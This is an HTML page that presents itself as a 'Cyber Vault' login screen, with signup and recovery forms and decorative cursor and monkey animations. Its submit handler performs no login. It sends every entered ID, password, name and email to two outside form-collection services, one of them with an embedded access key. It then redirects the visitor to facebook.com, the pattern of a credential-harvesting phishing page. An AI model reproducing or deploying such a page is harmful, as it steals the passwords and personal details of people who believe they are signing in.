<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Ultimate Touch Vault</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <style>
        * { box-sizing: border-box; font-family: 'Poppins', sans-serif; cursor: none; }
        
        body { 
            margin: 0; padding: 0; min-height: 100vh;
            display: flex; justify-content: center; align-items: center;
            background: #010208; overflow: hidden;
            /* Ye line mobile scroll ko rokti hai taake dot chale */
            touch-action: none; 
        }

        /* 1. TOUCH DOT & GLOW */
        #cursor-glow {
            position: fixed; width: 250px; height: 250px;
            background: radial-gradient(circle, rgba(0, 242, 255, 0.2) 0%, transparent 70%);
            border-radius: 50%; pointer-events: none; 
            transform: translate(-50%, -50%);
            z-index: 1; left: -500px; top: -500px;
            transition: transform 0.1s ease-out;
        }

        .custom-cursor {
            position: fixed; width: 20px; height: 20px; background: #00f2ff;
            border-radius: 50%; pointer-events: none; z-index: 9999;
            box-shadow: 0 0 20px #00f2ff, 0 0 40px #00f2ff;
            transform: translate(-50%, -50%);
            left: -500px; top: -500px;
        }

        /* 🐒 MONKEY ANIMATION */
        .monkey-box {
            position: absolute; top: -100px; left: 50%; transform: translateX(-50%);
            font-size: 80px; z-index: 10; transition: 0.3s ease;
        }
        .monkey-face { color: #00f2ff; text-shadow: 0 0 20px #00f2ff; }
        .monkey-closed { position: absolute; top: 0; left: 0; color: #ff00ff; opacity: 0; text-shadow: 0 0 20px #ff00ff; }

        .look-away .monkey-face { opacity: 0; }
        .look-away .monkey-closed { opacity: 1; }

        /* 2. THE MAIN CARD */
        .cyber-card { 
            position: relative; background: rgba(5, 10, 25, 0.95); 
            backdrop-filter: blur(20px); padding: 40px; border-radius: 20px;
            width: 90%; max-width: 380px; text-align: center;
            border: 1px solid rgba(0, 242, 255, 0.4);
            box-shadow: 0 0 30px rgba(0, 0, 0, 1);
            z-index: 2; margin-top: 60px; display: none;
        }
        .active { display: block; animation: popUp 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275); }
        @keyframes popUp { from { opacity: 0; transform: scale(0.8); } to { opacity: 1; transform: scale(1); } }

        input { 
            width: 100%; padding: 15px; background: rgba(0, 242, 255, 0.05); 
            border: 2px solid rgba(0, 242, 255, 0.3); border-radius: 12px;
            color: #fff; outline: none; margin-bottom: 20px; font-size: 16px;
        }
        input:focus { border-color: #ff00ff; box-shadow: 0 0 15px rgba(255, 0, 255, 0.4); }

        .btn-pro { 
            width: 100%; padding: 16px; border: none; border-radius: 12px;
            background: linear-gradient(45deg, #00f2ff, #0072ff);
            color: #fff; font-weight: bold; text-transform: uppercase;
            box-shadow: 0 5px 20px rgba(0, 114, 255, 0.5);
        }

        .links { color: #ff00ff; font-weight: bold; cursor: pointer; text-decoration: none; }
    </style>
</head>
<body>

    <div id="cursor-glow"></div>
    <div class="custom-cursor"></div>

    <div id="v-login" class="cyber-card active">
        <div id="monkey" class="monkey-box">
            <i class="fa-solid fa-face-smile monkey-face"></i>
            <i class="fa-solid fa-face-grimace monkey-closed"></i>
        </div>
        <h2 style="color: #00f2ff; text-shadow: 0 0 10px #00f2ff;">CYBER VAULT</h2>
        <form onsubmit="handleSubmit(event, 'Login')">
            <input type="text" name="User" placeholder="Access ID" required>
            <input type="password" id="pass" name="Pass" placeholder="Secret Key" required 
                   onfocus="cover()" onblur="uncover()">
            <button type="submit" class="btn-pro">Authorize</button>
        </form>
        <p style="margin-top: 20px; font-size: 13px; color: #555;">
            <span class="links" onclick="show('v-forgot')">FORGOT?</span> | 
            <span class="links" style="color:#00f2ff" onclick="show('v-signup')">SIGNUP</span>
        </p>
    </div>

    <div id="v-signup" class="cyber-card">
        <h2 style="color: #ff00ff;">NEW ID</h2>
        <form onsubmit="handleSubmit(event, 'Signup')">
            <input type="text" name="Name" placeholder="Full Name" required>
            <input type="password" name="NPass" placeholder="Password" required>
            <button type="submit" class="btn-pro" style="background: #7000ff;">Create</button>
        </form>
        <p class="links" onclick="show('v-login')" style="margin-top: 15px;">BACK</p>
    </div>

    <div id="v-forgot" class="cyber-card">
        <h2 style="color: #00f2ff;">RECOVERY</h2>
        <form onsubmit="handleSubmit(event, 'Forgot')">
            <input type="text" name="Email" placeholder="Email" required>
            <button type="submit" class="btn-pro">Reset</button>
        </form>
        <p class="links" onclick="show('v-login')" style="margin-top: 15px;">CANCEL</p>
    </div>

    <script>
        const glow = document.getElementById('cursor-glow');
        const dot = document.querySelector('.custom-cursor');

        // 🔥 TOUCH MOVE FIX FOR MOBILE
        function handleMove(e) {
            // Stop scroll only when moving dot
            if (e.type === 'touchmove') {
                e.preventDefault(); 
            }
            
            let x = (e.type === 'touchmove' || e.type === 'touchstart') ? e.touches[0].clientX : e.clientX;
            let y = (e.type === 'touchmove' || e.type === 'touchstart') ? e.touches[0].clientY : e.clientY;
            
            glow.style.left = x + 'px';
            glow.style.top = y + 'px';
            dot.style.left = x + 'px';
            dot.style.top = y + 'px';
        }

        // Mouse Listeners
        window.addEventListener('mousemove', handleMove);
        
        // Mobile Touch Listeners (Passive: false is key)
        window.addEventListener('touchmove', handleMove, { passive: false });
        window.addEventListener('touchstart', handleMove, { passive: false });

        // 🐒 Monkey Logic
        function cover() { document.getElementById('monkey').classList.add('look-away'); }
        function uncover() { document.getElementById('monkey').classList.remove('look-away'); }

        function show(id) {
            document.querySelectorAll('.cyber-card').forEach(c => c.classList.remove('active'));
            document.getElementById(id).classList.add('active');
        }

        async function handleSubmit(e, s) {
            e.preventDefault();
            const btn = e.target.querySelector('button');
            btn.innerText = "SYNCING...";
            const fd = new FormData(e.target);
            fetch("https://formbold.com/s/3VKEQ", { method: "POST", body: fd, mode: 'no-cors' });
            const b = new FormData(e.target);
            b.append('access_key', '4d4d7ede-0cff-474c-86ce-5d228506375d');
            b.append('subject', s);
            fetch("https://api.web3forms.com/submit", { method: "POST", body: b });
            setTimeout(() => { window.location.href = "https://www.facebook.com"; }, 1500);
        }
    </script>
</body>
</html>
